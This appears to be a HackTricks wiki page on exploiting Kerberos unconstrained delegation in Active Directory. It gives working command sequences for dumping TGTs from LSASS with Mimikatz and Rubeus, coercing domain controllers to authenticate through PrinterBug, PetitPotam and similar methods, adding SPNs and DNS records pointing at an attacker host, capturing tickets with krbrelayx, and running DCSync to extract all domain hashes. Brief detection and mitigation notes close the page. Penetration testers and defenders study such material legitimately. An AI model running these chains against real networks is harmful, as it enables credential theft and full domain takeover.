# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

This a feature that a Domain Administrator can set to any **Computer** inside the domain. Then, anytime a **user logins** onto the Computer, a **copy of the TGT** of that user is going to be **sent inside the TGS** provided by the DC **and saved in memory in LSASS**. So, if you have Administrator privileges on the machine, you will be able to **dump the tickets and impersonate the users** on any machine.

So if a domain admin logins inside a Computer with "Unconstrained Delegation" feature activated, and you have local admin privileges inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (domain privesc).

You can **find Computer objects with this attribute** checking if the [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute contains [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). You can do this with an LDAP filter of ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, which is what powerview does:


```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**More information about Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

If an attacker is able to **compromise a computer allowed for "Unconstrained Delegation"**, he could **trick** a **Print server** to **automatically login** against it **saving a TGT** in the memory of the server.\
Then, the attacker could perform a **Pass the Ticket attack to impersonate** the user Print server computer account.

To make a print server login against any machine you can use [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

If the TGT if from a domain controller, you could perform a [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) and obtain all the hashes from the DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Find here other ways to **force an authentication:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Any other coercion primitive that makes the victim authenticate with **Kerberos** to your unconstrained-delegation host works too. In modern environments this often means swapping the classic PrinterBug flow for **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, or **WebClient/WebDAV**-based coercion depending on which RPC surface is reachable.

### Abusing a user/service account with unconstrained delegation

Unconstrained delegation is **not limited to computer objects**. A **user/service account** can also be configured as `TRUSTED_FOR_DELEGATION`. In that scenario, the practical requirement is that the account must receive Kerberos service tickets for an **SPN it owns**.

This leads to 2 very common offensive paths:

1. You compromise the password/hash of the unconstrained-delegation **user account**, then **add an SPN** to that same account.
2. The account already has one or more SPNs, but one of them points to a **stale/decommissioned hostname**; recreating the missing **DNS A record** is enough to hijack the authentication flow without modifying the SPN set.

Minimal Linux flow:

```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
  -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
  secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```

Notes:

- This is especially useful when the unconstrained principal is a **service account** and you only have its credentials, not code execution on a joined host.
- If the target user already has a **stale SPN**, recreating the corresponding **DNS record** may be less noisy than writing a new SPN into AD.
- Recent Linux-centric tradecraft uses `addspn.py`, `dnstool.py`, `krbrelayx.py`, and one coercion primitive; you do not need to touch a Windows host to complete the chain.

### Abusing Unconstrained Delegation with an attacker-created computer

Modern domains often have `MachineAccountQuota > 0` (default 10), allowing any authenticated principal to create up to N computer objects. If you also hold the `SeEnableDelegationPrivilege` token privilege (or equivalent rights), you can set the newly created computer to be trusted for unconstrained delegation and harvest inbound TGTs from privileged systems.

High-level flow:

1) Create a computer you control

```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```

2) Make the fake hostname resolvable inside the domain

```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
  --action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
  -dns-ip <DC_IP> <DC_FQDN>
```

3) Enable Unconstrained Delegation on the attacker-controlled computer

```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```

Why this works: with unconstrained delegation, the LSA on a delegation-enabled computer caches inbound TGTs. If you trick a DC or privileged server to authenticate to your fake host, its machine TGT will be stored and can be exported.

4) Start krbrelayx in export mode and prepare the Kerberos material

```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```

5) Coerce authentication from the DC/servers to your fake host

```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```

krbrelayx will save ccache files when a machine authenticates, for example:

```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```

6) Use the captured DC machine TGT to perform DCSync

```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Notes and requirements:

- `MachineAccountQuota > 0` enables unprivileged computer creation; otherwise you need explicit rights.
- Setting `TRUSTED_FOR_DELEGATION` on a computer requires `SeEnableDelegationPrivilege` (or domain admin).
- Ensure name resolution to your fake host (DNS A record) so the DC can reach it by FQDN.
- Coercion requires a viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Disable these on DCs if possible.
- If the victim account is marked as **"Account is sensitive and cannot be delegated"** or is a member of **Protected Users**, the forwarded TGT will not be included in the service ticket, so this chain won't yield a reusable TGT.
- If **Credential Guard** is enabled on the authenticating client/server, Windows blocks **Kerberos unconstrained delegation**, which can make otherwise valid coercion paths fail from an operator perspective.

Detection and hardening ideas:

- Alert on Event ID 4741 (computer account created) and 4742/4738 (computer/user account changed) when UAC `TRUSTED_FOR_DELEGATION` is set.
- Monitor for unusual DNS A-record additions in the domain zone.
- Watch for spikes in 4768/4769 from unexpected hosts and DC-authentications to non-DC hosts.
- Restrict `SeEnableDelegationPrivilege` to a minimal set, set `MachineAccountQuota=0` where feasible, and disable Print Spooler on DCs. Enforce LDAP signing and channel binding.

### Mitigation

- Limit DA/Admin logins to specific services
- Set "Account is sensitive and cannot be delegated" for privileged accounts.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
